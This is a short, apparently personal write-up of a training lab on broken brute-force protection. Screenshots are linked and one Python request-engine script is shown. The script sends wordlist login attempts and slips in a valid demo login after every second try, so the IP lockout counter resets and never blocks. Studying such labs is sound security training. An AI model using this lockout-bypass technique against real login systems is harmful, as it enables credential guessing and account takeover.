# [Authentication] Lab: Broken brute-force protection, IP block (1)

---

![Untitled](%5BAuthentication%5D%20Lab%20Broken%20brute-force%20protection%20e6d6fa7c0d064ce5b367314d99372937/Untitled.png)

Lets visit the site without a proxy on. to map out the application and get a understanding how the application is designed. 

![Untitled](%5BAuthentication%5D%20Lab%20Broken%20brute-force%20protection%20e6d6fa7c0d064ce5b367314d99372937/Untitled%201.png)

Send to test values to the applicaiton: 

![Untitled](%5BAuthentication%5D%20Lab%20Broken%20brute-force%20protection%20e6d6fa7c0d064ce5b367314d99372937/Untitled%202.png)

![Untitled](%5BAuthentication%5D%20Lab%20Broken%20brute-force%20protection%20e6d6fa7c0d064ce5b367314d99372937/Untitled%203.png)

![Untitled](%5BAuthentication%5D%20Lab%20Broken%20brute-force%20protection%20e6d6fa7c0d064ce5b367314d99372937/Untitled%204.png)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    usernameValid = 'wiener'
    passwordValid = 'peter'

    veryLongPassword = 'VeRyLoNgPaSsWoRd!123456789'
    request_count = 0

    for word in open('C:\Users\micha\Desktop\Burp-Suite-Stuff\usernames_authLAB.txt.txt'):
        engine.queue(target.req, [word.rstrip(), veryLongPassword])
        request_count += 1  # Increment the counter for each request
        
        if request_count % 2 == 0:
            engine.queue(target.req, [usernameValid, passwordValid])
            request_count = 0  # Reset the counter after sending the valid login
        else:
            print('')  # Print an empty line (optional)

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length, and req.response
    if req.status != 404:
        table.add(req)
```

![Untitled](%5BAuthentication%5D%20Lab%20Broken%20brute-force%20protection%20e6d6fa7c0d064ce5b367314d99372937/Untitled%205.png)

![Untitled](%5BAuthentication%5D%20Lab%20Broken%20brute-force%20protection%20e6d6fa7c0d064ce5b367314d99372937/Untitled%206.png)